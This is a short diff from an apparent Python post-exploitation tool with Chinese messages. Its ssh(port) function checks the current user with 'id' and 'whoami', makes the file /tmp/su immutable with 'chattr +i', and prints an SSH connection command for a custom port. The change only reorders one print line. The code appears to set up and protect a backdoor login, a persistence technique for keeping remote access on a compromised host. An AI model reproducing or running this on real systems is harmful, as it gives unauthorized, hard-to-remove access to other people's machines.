@@ -37,8 +37,8 @@ def ssh(port):
         user = ml('id').strip()
         print("当前用户权限为:", user)
         user = ml('whoami').strip()
-        print('------>连接命令为:ssh ' + str(user) + '@ip -p ' + str(port)+'<------')
         ml('chattr +i /tmp/su')
+        print('------>连接命令为:ssh ' + str(user) + '@ip -p ' + str(port)+'<------')
     except Exception as e:
         print("连接失败")
     finally:
